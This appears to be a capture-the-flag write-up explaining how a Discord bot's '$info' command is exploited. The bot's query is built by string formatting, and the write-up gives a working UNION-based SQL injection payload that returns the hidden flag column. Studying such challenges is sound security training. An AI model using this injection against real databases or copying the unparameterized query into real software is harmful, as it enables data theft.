# Marvin

This was a discord bot sql injection challenge.
We got the github for the marvin bot with vulnerabilities in it. The bot would take DM's and respond to the user based on those DM's. The sql file indicates where the flag is saved:
```
CREATE TABLE challenges (
	chal_id INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY,
	flag VARCHAR(150),
	points INT(11),
	name VARCHAR(50),
	download VARCHAR(150),
	access VARCHAR(150),
	description VARCHAR(1000),
	category VARCHAR(20),
	release_time TIMESTAMP,
	num_weeks INT(11)
);
```
We want to try to get what's in the flag table for the marvin challenge. So we can use the api to do that.
In the `Member.py` file there's a function that takes in the user command `$info` that responds to the user with information directly correlated to the user input. This is the optimal command to attack in this challenge.
```
@commands.command(name='info', help='gets info for a specified challenge')
async def info(self, ctx, name):
	# check that user is verified
	if not await self.is_verified(ctx):
	return

	chal_details = self.db.sql_fetchone("SELECT name,category,points,download,access,description FROM challenges WHERE name='%s'" % name)

	if(not chal_details):
		await ctx.send("chal not found")
		return

	labels = ["NAME", "CATEGORY", "POINTS", "DOWNLOAD LINK", "ACCESS", "DESCRIPTION"]
	await ctx.send("\n".join([labels[i] + ": " + str(chal_details[i]) for i in range(len(labels))]))
```
If we craft an injection to copy the sql request but instead include the flag in the request, we can get a response with the flag in it.

`$info " marvin' UNION SELECT name,category,flag,download,access,description FROM challenges WHERE name='marvin"`

The marvin in there is to tell the request to look where the name is the name of our current challenge. With a `UNION` command the number of columns needs to match the number of tables in the original request. Copying the original request would select all the same columns, but instead of grabbing the points, you grab the flag.

